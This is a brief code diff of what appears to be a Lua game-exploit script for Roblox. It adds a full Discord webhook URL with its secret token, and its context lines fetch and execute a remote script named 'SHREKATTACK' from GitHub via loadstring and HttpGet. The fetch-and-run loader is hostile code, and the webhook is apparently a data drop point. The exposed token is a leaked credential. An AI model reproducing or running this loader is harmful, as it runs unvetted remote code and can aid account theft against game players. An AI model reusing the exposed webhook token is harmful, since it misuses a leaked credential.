@@ -1,4 +1,4 @@
-_G.webhooksdiscord = "YOUR URL WEBHOOK"
+_G.webhooksdiscord = "https://discord.com/api/webhooks/1039371823848095784/Wpgo2qlPw78l3X5Jt0ImV-fUGvTRPpPI9CQcjt1yISF3AMRTwXOc8F5F-ths_CsW5R2w"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 while wait() do
